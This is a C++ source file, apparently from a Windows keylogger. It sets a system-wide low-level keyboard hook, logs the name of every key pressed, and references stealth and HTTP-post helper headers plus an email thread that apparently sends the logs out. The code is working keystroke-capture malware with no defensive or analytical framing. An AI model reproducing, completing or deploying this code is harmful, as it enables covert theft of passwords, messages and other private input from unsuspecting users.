#include <atomic>
#include <mutex>
#include <vector>
#include "../include/Stealth.h"
#include "../include/IO.h"
#include "../include/key_constants.h"
#include "../include/post_request.h"

std::atomic<bool> g_running(true);

// Callback function for processing keyboard events
LRESULT CALLBACK keyboard_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lParam;
        char keyName[256] = {0};

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            DWORD scanCode = MapVirtualKey(kbs->vkCode, MAPVK_VK_TO_VSC);
            GetKeyNameTextA(scanCode << 16, keyName, sizeof(keyName));

            std::lock_guard<std::mutex> lock(g_logMutex);
            g_plainLogs.insert(g_plainLogs.end(), keyName, keyName + strlen(keyName));
        }
    }
    return CallNextHookEx(eHook, nCode, wParam, lParam);
}

bool install_hook() {
    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_proc, GetModuleHandle(NULL), 0);
    return eHook != NULL;
}

bool uninstall_hook() {
    bool b = UnhookWindowsHookEx(eHook);
    eHook = NULL;

    // SECURELY CLEAR IN-MEMORY LOGS
    {
        std::lock_guard<std::mutex> lock(g_logMutex);
        SecureZeroMemory(g_plainLogs.data(), g_plainLogs.size());
        g_plainLogs.clear();
        g_plainLogs.shrink_to_fit(); // Free memory
    }

    // Signal email thread to stop
    g_running = false;

    return b;
}

bool is_hooked() {
    return eHook != NULL;
}
